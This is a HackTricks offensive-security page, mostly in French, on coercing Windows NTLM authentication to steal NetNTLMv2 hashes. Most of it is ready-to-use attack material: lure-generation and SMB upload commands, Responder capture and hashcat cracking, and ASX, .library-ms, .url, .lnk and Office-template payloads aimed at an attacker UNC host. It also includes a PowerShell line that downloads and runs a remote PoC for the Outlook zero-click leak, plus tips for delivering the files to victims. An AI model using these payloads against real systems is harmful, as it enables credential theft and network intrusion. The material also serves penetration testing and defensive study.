# Endroits pour voler des NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Consultez toutes les excellentes idées de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — du téléchargement d'un fichier Microsoft Word en ligne à la source des ntlm leaks : https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md et [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Partage SMB inscriptible + leurres UNC déclenchés par Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Si vous pouvez **écrire sur un partage que des utilisateurs ou des tâches planifiées parcourent dans Explorer**, déposez des fichiers dont les métadonnées pointent vers votre UNC (par ex. `\\ATTACKER\share`). L'affichage du dossier déclenche une **authentification SMB implicite** et provoque des leaks d'un **NetNTLMv2** vers votre listener.

1. **Générez des leurres** (couvre SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Déposez-les sur le partage accessible en écriture** (n'importe quel dossier que la victime ouvre):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows peut accéder à plusieurs fichiers à la fois ; tout ce que Explorer prévisualise (`BROWSE TO FOLDER`) ne nécessite aucun clic.

### Playlists de Windows Media Player (.ASX/.WAX)

Si vous parvenez à faire ouvrir ou prévisualiser par une cible une playlist de Windows Media Player que vous contrôlez, vous pouvez leak Net‑NTLMv2 en pointant l'entrée vers un chemin UNC. WMP tentera de récupérer le média référencé via SMB et s'authentifiera implicitement.

Exemple de payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flux de collecte et de cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

L'Explorateur Windows gère de manière non sécurisée les fichiers .library-ms lorsqu'ils sont ouverts directement depuis une archive ZIP. Si la définition de la bibliothèque pointe vers un chemin UNC distant (e.g., \\attacker\share), le simple fait de parcourir/lancer le .library-ms à l'intérieur du ZIP fait que l'Explorateur énumère le UNC et envoie une authentification NTLM à l'attaquant. Cela génère un NetNTLMv2 qui peut être craqué hors ligne ou éventuellement relayé.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Create the .library-ms file with the XML above (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
- Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows traitait la propriété MAPI étendue PidLidReminderFileParameter dans les éléments de calendrier. Si cette propriété pointe vers un chemin UNC (e.g., \\attacker\share\alert.wav), Outlook contacterait le SMB share lorsque le rappel se déclenche, provoquant un leak du Net‑NTLMv2 de l’utilisateur sans aucun clic. Cela a été corrigé le 14 mars 2023, mais reste très pertinent pour des parcs hérités/non mis à jour et pour la réponse aux incidents historiques.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Côté Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- A victim only needs Outlook for Windows running when the reminder triggers.
- Le leak fournit Net‑NTLMv2, adapté au cracking hors ligne ou au relay (pas de pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer affiche automatiquement les icônes des raccourcis. Des recherches récentes ont montré que même après le patch d’avril 2025 de Microsoft pour les raccourcis d’icône UNC, il était encore possible de déclencher une authentification NTLM sans clic en hébergeant la cible du raccourci sur un chemin UNC tout en gardant l’icône locale (contournement du patch assigné CVE‑2025‑50154). Le simple fait de visualiser le dossier pousse Explorer à récupérer des métadonnées depuis la cible distante, émettant du NTLM vers le serveur SMB de l’attaquant.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Raccourci de programme payload (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Déposer le raccourci dans un ZIP et amener la victime à le parcourir.
- Placer le raccourci sur un partage inscriptible que la victime ouvrira.
- Combiner avec d'autres fichiers leurres dans le même dossier pour que Explorer prévisualise les éléments.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows charge les métadonnées `.lnk` lors de la **visualisation/aperçu** (rendu de l'icône), pas seulement à l'exécution. CVE‑2026‑25185 montre un chemin d'analyse où des blocs **ExtraData** poussent le shell à résoudre un chemin d'icône et à toucher le système de fichiers **pendant le chargement**, émettant des NTLM sortants lorsque le chemin est distant.

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- Inclure **DARWIN_PROPS** (`0xa0000006`) dans ExtraData (porte d'entrée vers la routine de mise à jour d'icône).
- Inclure **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) avec **TargetUnicode** renseigné.
- Le loader développe les variables d'environnement dans `TargetUnicode` et appelle `PathFileExistsW` sur le chemin obtenu.

Si `TargetUnicode` se résout en un chemin UNC (par ex., `\\attacker\share\icon.ico`), le simple fait de **visualiser un dossier** contenant le raccourci provoque une authentification sortante. Le même chemin de chargement peut aussi être atteint par l'**indexation** et l'**analyse AV**, ce qui en fait une surface de leak sans clic pratique.

Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.

### Office remote template injection (.docx/.dotm) to coerce NTLM

Les documents Office peuvent référencer un modèle externe. Si vous définissez le modèle attaché sur un chemin UNC, l'ouverture du document s'authentifiera auprès de SMB.

Minimal DOCX relationship changes (inside word/):

1) Éditez word/settings.xml et ajoutez la référence au modèle joint:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Éditez word/_rels/settings.xml.rels et pointez rId1337 vers votre UNC :
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Repackez en .docx et livrez. Lancez votre SMB capture listener et attendez qu'il soit ouvert.

Pour des idées post-capture sur le relaying ou l'abusing de NTLM, consultez :

{{#ref}}
README.md
{{#endref}}


## Références
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
